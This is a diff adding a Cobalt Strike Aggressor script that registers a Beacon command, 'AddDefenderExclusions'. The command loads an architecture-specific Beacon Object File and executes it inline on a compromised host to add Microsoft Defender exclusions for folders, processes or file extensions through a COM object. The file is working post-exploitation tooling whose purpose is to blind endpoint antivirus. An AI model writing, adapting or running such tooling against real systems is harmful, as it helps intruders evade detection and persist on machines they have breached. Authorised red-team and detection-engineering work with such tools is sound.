@@ -1,0 +1,37 @@
+alias AddDefenderExclusions {
+    local('$barch $handle $data $args');
+  
+    if(size(@_) != 3)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("AddDefenderExclusions"));
+        return;
+    }
+
+    # figure out the arch of this session
+    $barch  = barch($1);
+
+    # read in the right BOF file
+    println(script_resource("AddDefenderExclusions. $+ $barch $+ .o"));
+    $handle = openf(script_resource("AddDefenderExclusions. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # pack our arguments
+    $args   = bof_pack($1, "iZ", $2,$3);
+
+    # announce what we're doing
+    btask($1, "Running AddDefenderExclusions BOF");
+
+    # execute it.
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+"AddDefenderExclusions", 
+"Add Defender Exclusions via com object", 
+"Synopsis: AddDefenderExclusions 1 C:\\
+You must supply an argument between 1 and 3.\n
+1: Folder exclusions\n
+2: Process exclusions\n
+3: Extension exclusions.");
